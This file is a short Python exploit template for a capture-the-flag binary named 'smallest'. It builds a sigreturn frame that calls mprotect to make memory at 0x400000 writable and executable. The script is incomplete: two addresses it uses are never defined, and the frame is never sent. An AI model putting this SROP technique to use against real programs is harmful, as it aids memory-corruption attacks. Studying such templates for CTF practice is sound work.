# File: exp.py
# Author: raycp
# Date: 2019-06-02
# Description: template for srop

from pwn_debug import *


pdbg=pwn_debug("./smallest")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.23")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()

def pwn():
    
    
    ## sigreturn syscall number is 15 in x64, 119 in x86
    frame = SigreturnFrame()
    frame.rax = 10  # mprotect
    frame.rdi = 0x400000
    frame.rsi = 0x1000
    frame.rdx = 0x7
    frame.rsp = entry_addr
    frame.rip = syscall_ret

    #pdbg.bp(0x4000BE)
    

    p.interactive() 

if __name__ == '__main__':
    pwn()


